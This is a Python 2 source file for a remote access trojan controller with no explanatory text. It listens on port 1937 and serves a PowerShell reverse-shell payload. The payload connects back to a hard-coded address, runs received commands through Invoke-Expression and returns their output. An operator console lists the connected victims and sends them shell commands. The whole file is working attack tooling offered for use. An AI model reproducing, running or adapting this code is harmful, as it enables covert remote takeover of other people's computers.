import socket
import threading

allConnections = []
allAddresses = []
clientCount = 0
    
def main():
    threadCommand = threading.Thread(target=get_command)
    threadCommand.start()
    threadService = threading.Thread(target=service)
    threadService.start()
    
def get_command():
    while 1:
        command = raw_input("> ")
        if command == "list":
            print "pk------address-----------------port"
            pk = 1
            for i in allAddresses:
                print str(pk) +"------" + str(i[0]) + "---------" + str(i[1])
                pk += 1
        elif command.startswith("c"):
            try:
                pk = int(command[2:])-1
            except:
                print "usage:c client_pk,exp:c 1"

            while 1:
                try:
                    msg = raw_input("control %s:%s> " % (allAddresses[pk][0], allAddresses[pk][1]))
                    #if msg == "exit":
                    #    break
                    allConnections[pk].send(msg)
                    allConnections[pk].settimeout(5)
                    result = allConnections[pk].recv(1024)
                    result = result.decode('utf8')
                    print result

                except KeyboardInterrupt:
                    print "Catch C-c"
                    break
                except Exception, e:
                    print "error:" + str(e)
                    break
                            

                

def service():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 1937
    sock.bind(('', port))
    sock.listen(5)
    while 1:
        try:
            conn, addr = sock.accept()
            conn.setblocking(1)
            if conn:
                request = conn.recv(23)
            print request
            if request.find("/connect") > 0:
                send_message(keep_connect("192.168.199.100", port), conn)
            else:
                allConnections.append(conn)
                allAddresses.append(addr)
                print "Connected with " + addr[0] + ":" + str(addr[1])
        except Exception, e:
            print "error:" + str(e)
            break

def keep_connect(ip, port):
    message = '$client = New-Object System.Net.Sockets.TcpClient("%s",%d)' % (ip, port)
    message += '''
                $stream = $client.GetStream()
                [byte[]]$bytes = 0..65535|%{0}
                if ($stream.CanWrite)
                {
                            $sendBytes = ([text.encoding]::ASCII).GetBytes("rat")
                            $stream.Write($sendBytes, 0, $sendBytes.Length)
                            while (1)
                            {
                                 try{
                                     $data = $stream.read($bytes, 0, $bytes.Length)
                                     $EncodedText = New-Object -TypeName System.Text.UTF8Encoding
                                     $info = $EncodedText.GetString($bytes,0, $data)
                                     $sendback = (Invoke-Expression -Command $info 2>&1 | Out-String )
                                     $sendbackBytes = ([text.encoding]::UTF8).GetBytes($sendback)
                                     $stream.Write($sendbackBytes,0,$sendbackBytes.Length)
                                     write($info)
                                 }
                                 catch
                                 {
                                     Write-Error $_
                                     continue
                                 }
                            }
                }
                else
                {       }
	      '''
    return message

def send_message(msg, conn):
    try:
        httpHead = "HTTP/1.1 200 OK\r\n"
        httpHead += "Content-type: text/html; charset=utf-8\r\n"
        httpHead += "Connection: Keep-Alive\r\n"
        httpHead += "Server: test\r\n"
        httpHead += "Content-Length: %d\r\n" % len(msg)
        httpHead += "\r\n"

        conn.send(httpHead + msg)
        return 1
    except:
        return 0    
    
            
main()
